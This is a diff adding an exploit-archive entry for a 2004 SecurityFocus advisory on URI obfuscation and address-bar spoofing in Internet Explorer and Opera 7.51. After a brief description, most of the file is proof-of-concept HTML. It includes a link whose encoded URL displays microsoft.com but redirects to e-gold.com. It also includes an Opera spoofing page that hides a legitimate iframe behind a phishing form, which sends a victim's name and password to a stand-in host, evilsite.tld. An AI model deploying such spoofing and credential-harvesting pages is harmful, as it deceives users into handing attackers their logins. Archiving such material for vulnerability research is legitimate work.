@@ -1,0 +1,156 @@
+source: http://www.securityfocus.com/bid/10517/info
+
+A weakness is reported in Microsoft Internet Explorer and Opera allowing an attacker to obfuscate the URI of a link. This could facilitate the impersonation of legitimate web sites in order to steal sensitive information from unsuspecting users.
+
+An attacker may exploit this weakness to make a user think they are visiting a legitimate site, when in reality they are being redirected to an attacker controlled site.
+
+Update: an attacker may be able to use this issue to bypass zone restrictions in Internet Explorer.
+
+Opera 7.51 is also affected.
+
+
+!-- 10.06.04 courtesy of: bitlance bitlance_3@hotmail.com -->
+<a title=" http://www.microsoft.com" href="http://www.microsoft.com">
+<table>
+<caption>
+<a href="http://www.microsoft.com">
+<label for="foo">
+<u style="cursor: pointer; color: blue">
+http://www.microsoft.com
+</u>
+</label>
+</a>
+<form method="get" action="http://www.microsoft.com%2F redir=www.e-gold.com">
+
+<input id="foo" type="image" height="0" width="0">
+</form>
+
+Regular URIs are also vulnerable:
+<a href="http://www.microsoft.com%2F redir=www.e-gold.com">test</a>
+
+The following proof of concept is available for Opera:
+[!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"]
+[html lang="en"]
+[head]
+[meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"]
+[meta http-equiv="Content-Script-Type" content="text/javascript"]
+[meta http-equiv="Content-Style-Type" content="text/css"]
+[meta http-equiv="REFRESH"
+content="0;url=javascript:(function(){})();"]
+[title]Opera 7.51 Address Bar Spoofing Vulnerability[/title]
+[script type="text/javascript"]
+[!-- hide JavaScript from old browsers
+var dummy="Do not remove this script element.";
+// end hiding JavaScript --]
+[/script]
+[style type="text/css"]
+[!-- /* hide iframe element. */
+iframe {
+display: none !important;
+}
+/* hide iframe element. */ --]
+[!-- /* pizza form */
+body {
+margin-left: 2em;
+margin-right: 2em;
+font-family:verdana;
+font-size:80%;
+}
+h1 { font-size:120%;}
+h2 { font-size:100%;}
+table { font-size:85%; background-color:buttonface; }
+table caption {
+background-color:activecaption; color:captiontext;
+font-weight:bold; text-align:left; }
+table table { font-size:100%; }
+table input { font-family:verdana; font-size:100%; }
+table select { font-family:verdana; font-size:100%; }
+/* pizza form */ --]
+[/style]
+[/head]
+[body]
+[h1]Opera Browser version 7.51 Address Bar Spoofing Vulnerability[/h1]
+[h2]Tested on Windows OS[/h2]
+[p][a href="http://www.opera.com/" title="Opera 7.51, Everything You Need
+Online"]
+Opera 7.51[/a], Everything You Need Online
+[/p]
+[iframe title="inline frame spoofing address bar"
+src="https://pizza.opera.com/order.html"]
+This inline frame is hidden. See CSS.
+[/iframe]
+[!-- below, phishing form order pizza --]
+[h2]Welcome to Pizza Opera dot Com[/h2]
+[form name="frmPizza" action="phishing://evilsite.tld"]
+[table id="tblPizzaForm" cellspacing="0" cellpadding="3"]
+[caption]Order Your Pizza[/caption]
+[tr valign="top"]
+[td][label for="txtName" accesskey="M"]Na[u]m[/u]e: [/label][/td]
+[td][input type="text" name="txtName" id="txtName"][/td]
+[/tr]
+[tr valign="top"]
+[td][label for="txtPassword" accesskey="P"][u]P[/u]assword: [/label][/td]
+[td][input type="password" name="txtPassword" id="txtPassword"][/td]
+[/tr]
+[tr valign="top"]
+[td][label for="selSize" accesskey="S"][u]S[/u]ize: [/label][/td]
+[td]
+[select name="selSize" id="selSize"]
+[option value="0"]--- pick a size --- [/option]
+[option value="1"]Small[/option]
+[option value="2"]Medium[/option]
+[option value="3"]Large[/option]
+[/select]
+[/td]
+[/tr]
+[tr valign="top"]
+[td colspan="2"]
+[fieldset id="fstCrust"]
+[legend]Crust[/legend]
+[table cellpadding="1" cellspacing="0"]
+[tr]
+[td][input type="radio" name="radCrust" id="radCrust_Thick"
+value="Thick"][/td]
+[td][label for="radCrust_Thick"
+accesskey="K"]Thic[u]k[/u][/label][/td]
+[td][input type="radio" name="radCrust" id="radCrust_Thin"
+value="Thin"][/td]
+[td][label for="radCrust_Thin" accesskey="N"]Thi[u]n[/u][/label][/td]
+[/tr]
+[/table]
+[/fieldset]
+[/td]
+[/tr]
+[tr valign="top"]
+[td colspan="2"]
+[fieldset id="fstToppings"]
+[legend]Toppings[/legend]
+[table cellpadding="1" cellspacing="0"]
+[tr]
+[td][input type="checkbox" name="chkHam" id="chkHam" value="Ham"][/td]
+[td][label for="chkHam" accesskey="H"][u]H[/u]am[/label][/td]
+[/tr]
+[tr]
+[td][input type="checkbox" name="chkPineapple" id="chkPineapple"
+value="Pineapple"][/td]
+[td][label for="chkPineapple"
+accesskey="I"]P[u]i[/u]neapple[/label][/td]
+[/tr]
+[tr]
+[td][input type="checkbox" name="chkExtraCheese" id="chkExtraCheese"
+value="Extra Cheese"][/td]
+[td][label for="chkExtraCheese" accesskey="E"][u]E[/u]xtra
+Cheese[/label][/td]
+[/tr]
+[/table]
+[/fieldset]
+[/td]
+[/tr]
+[tr valign="top"]
+[td colspan="2" align="right"][input type="submit" value=" Order!
+"][/td]
+[/tr]
+[/table]
+[/form]
+[/body]
+[/html]
